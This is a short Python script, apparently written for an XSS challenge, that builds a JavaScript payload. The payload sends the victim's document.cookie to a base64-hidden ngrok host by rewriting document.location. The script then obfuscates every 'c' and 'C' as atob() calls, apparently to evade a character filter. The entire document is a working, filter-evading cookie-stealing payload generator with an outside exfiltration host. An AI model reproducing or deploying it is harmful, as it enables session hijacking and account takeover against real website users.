str = 'document.location = \'+atob(\'J2h0dHA6Ly84NzYzLTEyMi0xNjctOC0xMjcubmdyb2suaW8/Jw==\')+\'+\'+\'document.cookie\'+\';'

result = ''
for i in str:
    if(i=='c'):
        result = result+"'+atob('Yw==')+'"
    elif(i=='C'):
        result = result+"'+atob('Qw==')+'"
    else:
        result = result+i

print(result)